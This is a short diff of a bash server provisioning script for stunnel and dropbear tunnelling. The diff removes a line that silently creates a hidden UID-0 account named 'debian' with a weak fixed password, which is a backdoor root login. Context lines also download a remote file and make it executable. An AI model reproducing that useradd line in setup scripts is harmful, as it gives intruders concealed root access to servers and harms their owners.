@@ -1,6 +1,3 @@
-
-
-
 #!/bin/bash
 #Script Variables
 apt update
@@ -614,7 +611,7 @@ echo "/bin/false" >> /etc/shells
 wget -O /etc/banner "https://raw.githubusercontent.com/Dexter-Hysteria/online/server_script/inter_service/file/banner"
 chmod +x /etc/banner
 
-useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
+
 sudo service stunnel4 restart
 sudo service dropbear restart
   } &>/dev/null
